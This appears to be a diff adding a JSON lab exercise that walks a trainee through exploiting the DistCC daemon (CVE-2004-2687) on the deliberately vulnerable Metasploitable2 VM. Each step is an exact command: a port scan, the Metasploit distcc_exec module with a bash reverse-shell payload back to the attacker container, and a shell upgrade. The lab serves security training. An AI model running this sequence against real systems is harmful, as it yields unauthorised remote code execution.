@@ -1,0 +1,77 @@
+{
+  "id": "metasploitable2-distcc",
+  "name": "Metasploitable2: DistCC RCE",
+  "difficulty": "easy",
+  "container": "metasploitable2",
+  "ip": "172.20.0.20",
+  "port": 3632,
+  "short_description": "Exploit the DistCC daemon for remote code execution on Metasploitable2.",
+  "description": "Metasploitable2 is a deliberately vulnerable Linux VM created by Rapid7 for security training. The DistCC (Distributed C Compiler) daemon allows remote code execution due to a misconfiguration. This is CVE-2004-2687.",
+  "steps": [
+    {
+      "title": "Scan the target for open ports",
+      "command": "nmap -sV -p- 172.20.0.20 --open",
+      "explanation": "Full port scan to discover all services. Metasploitable2 has many vulnerable services. We're looking for port 3632 (DistCC).",
+      "expected": "3632/tcp open  distccd"
+    },
+    {
+      "title": "Start Metasploit",
+      "command": "msfconsole -q",
+      "explanation": "Launch Metasploit Framework in quiet mode."
+    },
+    {
+      "title": "Search for DistCC exploits",
+      "command": "search distcc",
+      "explanation": "Find exploits for the DistCC service.",
+      "expected": "exploit/unix/misc/distcc_exec"
+    },
+    {
+      "title": "Load the DistCC exploit",
+      "command": "use exploit/unix/misc/distcc_exec",
+      "explanation": "Select the DistCC remote code execution module."
+    },
+    {
+      "title": "View options",
+      "command": "show options",
+      "explanation": "Check required parameters. RHOSTS (target) and LHOST (your IP for reverse shell) are needed."
+    },
+    {
+      "title": "Set the target host",
+      "command": "set RHOSTS 172.20.0.20",
+      "explanation": "Point the exploit at Metasploitable2."
+    },
+    {
+      "title": "Set your attack machine IP",
+      "command": "set LHOST 172.20.0.5",
+      "explanation": "This is the Kali container's IP for the reverse shell connection."
+    },
+    {
+      "title": "Set the payload",
+      "command": "set PAYLOAD cmd/unix/reverse_bash",
+      "explanation": "Use a bash reverse shell payload."
+    },
+    {
+      "title": "Run the exploit",
+      "command": "run",
+      "explanation": "Execute the exploit and get a shell.",
+      "expected": "Command shell session opened"
+    },
+    {
+      "title": "Check your access",
+      "command": "id",
+      "explanation": "See what user you're running as.",
+      "expected": "uid=1(daemon)"
+    },
+    {
+      "title": "Escalate to root (optional)",
+      "command": "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
+      "explanation": "Get a proper interactive shell. From here you can explore privilege escalation."
+    }
+  ],
+  "success_criteria": "You have a command shell on Metasploitable2. Run 'id' and 'hostname' to confirm you're on the target system.",
+  "next_steps": [
+    "Try other Metasploitable2 services: vsftpd, Samba, IRC",
+    "Explore privilege escalation with 'search post/multi/recon/local_exploit_suggester'",
+    "Use 'background' to keep the session and attack other services"
+  ]
+}
